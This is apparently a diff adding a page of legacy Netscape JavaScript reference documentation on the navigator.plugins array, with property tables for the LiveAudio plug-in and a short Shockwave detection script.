+
+<A NAME="plugins array"></A>
+<A NAME="1008559">
+<H2> plugins array</H2>
+</A>
+
+<A NAME="1008431">
+<I>plugins</I> is an array of all plug-ins currently installed on the client. Each element of the array is a <I>Plugin</I> object, which has properties for its name, file name, and description as well as an array of <I>MimeType</I> objects for the MIME types supported by that plug-in. The user can obtain a list of installed plug-ins by choosing About Plug-ins from the Help menu.<P></A>
+<A NAME="1010593">
+For example, the following table summarizes the values for the LiveAudio plug-in:
+
+<P><TABLE BORDER="2">
+<CAPTION></CAPTION>
+<tr align=left valign=bottom><th><b><A NAME="1010600">
+Expression</A><B><th><b><A NAME="1010602">
+Value</A><B>
+<tr align=left valign=top><td><A NAME="1010604">
+<code>navigator.plugins['LiveAudio'].name
+</code></A><BR>
+
+<td><A NAME="1010606">
+<code>LiveAudio
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1010608">
+<code>navigator.plugins['LiveAudio'].description
+</code></A><BR>
+
+<td><A NAME="1010610">
+<code>LiveAudio - Netscape Navigator 
+sound playing component
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1010612">
+<code>navigator.plugins['LiveAudio'].filename
+</code></A><BR>
+
+<td><A NAME="1010645">
+<code>d:\nettools\netscape\nav30\<br>
+Program\plugins\NPAUDIO.DLL
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1010616">
+<code>navigator.plugins['LiveAudio'].length
+</code></A><BR>
+
+<td><A NAME="1010618">
+<code>7
+</code></A><BR>
+
+
+
+
+</TABLE>
+
+<TABLE>
+<TR><TD>
+</TABLE>
+
+
+<P></A>
+<A NAME="1010659">
+In the previous table, the <I>length</I> property indicates that <code>navigator.plugins['LiveAudio']</code> has an array of <I>MimeType</I> objects containing seven elements. The property values for the second element of this array are as follows:
+
+<P><TABLE BORDER="2">
+<CAPTION></CAPTION>
+<tr align=left valign=bottom><th><b><A NAME="1010671">
+Expression</A><B><th><b><A NAME="1010673">
+Value</A><B>
+<tr align=left valign=top><td><A NAME="1010675">
+<code>navigator.plugins['LiveAudio'][1].type
+</code></A><BR>
+
+<td><A NAME="1010677">
+<code>audio/x-aiff
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1010679">
+<code>navigator.plugins['LiveAudio'][1].description
+</code></A><BR>
+
+<td><A NAME="1010681">
+<code>AIFF
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1010683">
+<code>navigator.plugins['LiveAudio'][1].suffixes
+</code></A><BR>
+
+<td><A NAME="1010685">
+<code>aif, aiff
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1010687">
+<code>navigator.plugins['LiveAudio'][1].enabledPlugin.name
+</code></A><BR>
+
+<td><A NAME="1010689">
+<code>LiveAudio
+</code></A><BR>
+
+
+
+
+</TABLE>
+
+<TABLE>
+<TR><TD>
+</TABLE>
+
+
+<P></A>
+<A NAME="1008571">
+The following script checks to see whether the Shockwave plug-in is installed and displays an embedded Shockwave movie if it is:<P></A>
+<A NAME="1008572">
+<PRE>var myPlugin = navigator.plugins["Shockwave"]<br>if (myPlugin)<br>&nbsp;&nbsp;&nbsp;document.writeln("&lt;EMBED SRC='Movie.dir' HEIGHT=100 WIDTH=100&gt;")<br>else<br>&nbsp;&nbsp;&nbsp;document.writeln("You don't have Shockwave installed!")</PRE>
+</A>
